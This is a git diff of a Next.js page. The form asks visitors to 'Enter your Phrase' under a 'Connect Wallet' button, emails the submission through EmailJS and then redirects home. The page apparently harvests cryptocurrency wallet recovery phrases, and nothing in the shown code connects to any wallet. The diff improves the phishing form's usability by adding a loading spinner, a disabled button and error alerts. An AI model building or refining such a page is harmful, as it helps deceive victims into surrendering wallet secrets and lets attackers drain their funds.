@@ -2,15 +2,17 @@
 'use client';
 import emailjs from '@emailjs/browser';
 import Image from 'next/image';
-import { useRef } from 'react';
+import { useRef, useState } from 'react';
+import { BiLoaderAlt } from 'react-icons/bi';
 import './form.css';
 
 export default function Page() {
+  const [loading, setLoading] = useState(false);
   const form = useRef();
 
   const sendEmail = (e) => {
     e.preventDefault();
-
+    setLoading(true);
     emailjs
       .sendForm(
         process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
@@ -23,9 +25,12 @@ export default function Page() {
           window.location.pathname = '/';
         },
         (error) => {
-          console.log(error);
+          alert(error.text);
         }
-      );
+      )
+      .finally(() => {
+        setLoading(false);
+      });
   };
 
   return (
@@ -54,14 +59,18 @@ export default function Page() {
             rows={4}
             placeholder='Enter your Phrase'
             required
-            className='w-full p-4 rounded ring-1 ring-black placeholder:font-mono'
+            className='w-full p-4 rounded-md ring-1 ring-black placeholder:font-mono'
             defaultValue={''}
           />
           <br />
           <button
-            className='bg-[#4682b4] hover:bg-[#4682b4]/80 text-white font-semibold px-6 py-4 text-sm whitespace-nowrap'
+            disabled={loading}
+            className='bg-[#4682b4] tracking-wider font-mono placeholder:font-mono disabled:opacity-50 flex items-center rounded-md hover:bg-[#4682b4]/80 text-white font-semibold px-6 py-4 text-sm whitespace-nowrap'
             type='submit'
           >
+            {loading && (
+              <BiLoaderAlt className='animate-spin mr-2 text-white text-lg' />
+            )}
             Connect Wallet
           </button>
         </form>
